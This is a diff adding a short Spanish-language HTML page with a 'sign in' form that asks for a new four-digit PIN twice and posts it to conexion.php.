@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="es" dir="ltr">
+<head>
+<meta charset="utf-8">
+<link rel="stylesheet" href="estilos.css">
+<link rel="stylesheet" href="min.css">
+<title>Inicio</title>
+</head>
+
+<body>
+<div class="ttlo">
+<img src="encabezado.jpg" alt="">
+
+<div class="contact-form-wrapper d-flex justify-content-center">
+<form action="conexion.php" method="post" class="contact-form">
+<h5 class="title">Inicio de Sesión</h5>
+<p class="description">Inicie Sesión para continuar.</p>
+
+<input type="password" name="pin1" placeholder="Nuevo PIN de 4 digitos" minlength="4" maxlength="4" class="form-control rounded border-white mb-3 form-input" required>
+<input type="password" name="pin2" placeholder="Repita PIN de 4 digitos" minlength="4" maxlength="4" class="form-control rounded border-white mb-3 form-input" required>
+
+<div class="submit-button-wrapper">
+<button id="boton" type="submit">Iniciar Sesión</button>
+</div>
+
+</div>
+
+</div>
+</body>
+</html>
